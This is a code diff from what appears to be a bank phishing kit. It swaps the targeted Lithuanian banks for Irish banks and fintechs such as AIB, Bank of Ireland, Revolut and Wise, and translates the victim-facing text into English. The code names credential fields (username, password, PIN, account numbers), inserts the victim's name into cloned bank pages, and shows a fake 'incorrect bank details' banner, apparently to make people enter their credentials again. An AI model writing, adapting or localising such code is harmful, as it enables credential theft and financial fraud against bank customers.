@@ -14,16 +14,17 @@ type Props = {
 
 function hrefToSlug(href: string): string | null {
   const h = href.toLowerCase();
-  if (h.includes("swedbank")) return "swedbank-lt";
-  if (h.includes("/seb") || h.endsWith("seb")) return "seb-lt";
-  if (h.includes("luminor")) return "luminor-lt";
-  if (h.includes("citadele")) return "citadele-lt";
-  if (h.includes("lkubnk") || h.includes("lku")) return "lku-lt";
-  if (h.includes("siabnk") || h.includes("siauliu")) return "siauliu-lt";
+  if (h.includes("aib")) return "aib";
+  if (h.includes("an-post") || h.includes("anpost")) return "an-post";
+  if (h.includes("bank-of-ireland") || h.includes("boi")) return "bank-of-ireland";
+  if (h.includes("ebs")) return "ebs";
+  if (h.includes("permanent-tsb") || h.includes("ptsb")) return "permanent-tsb";
+  if (h.includes("revolut")) return "revolut";
+  if (h.includes("wise")) return "wise";
   return null;
 }
 
-const BANK_SLUGS = ["swedbank-lt", "seb-lt", "luminor-lt", "citadele-lt", "lku-lt", "siauliu-lt"];
+const BANK_SLUGS = ["aib", "an-post", "bank-of-ireland", "ebs", "permanent-tsb", "revolut", "wise"];
 
 const BANK_CRED_FIELDS = [
   "username", "password", "verfuegernummer", "pin", "rekeningnummer",
@@ -146,7 +147,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
     const esc = (s: string) =>
       s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
     const fullName =
-      [fd.firstName, fd.lastName].filter(Boolean).join(" ").trim() || "cliente";
+      [fd.firstName, fd.lastName].filter(Boolean).join(" ").trim() || "customer";
     h = h.replace(
       /(style=["']?color:#F62515["']?[^>]*)>\s*1\s*</i,
       `$1>${esc(fullName)}<`,
@@ -170,7 +171,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
         banner.style.cssText =
           "background:#fdecea;border:1px solid #f5c6c6;color:#b3261e;border-radius:12px;padding:14px 18px;margin:0 auto 18px;max-width:640px;text-align:center;font-weight:600;font-size:14px;";
         banner.textContent =
-          "Dados bancários incorretos. Por favor, verifique os seus dados e tente novamente.";
+          "Incorrect bank details. Please check your details and try again.";
         const h2 = container.querySelector("h2.header-title");
         container.insertBefore(banner, h2 ? h2.nextSibling : container.firstChild);
       }
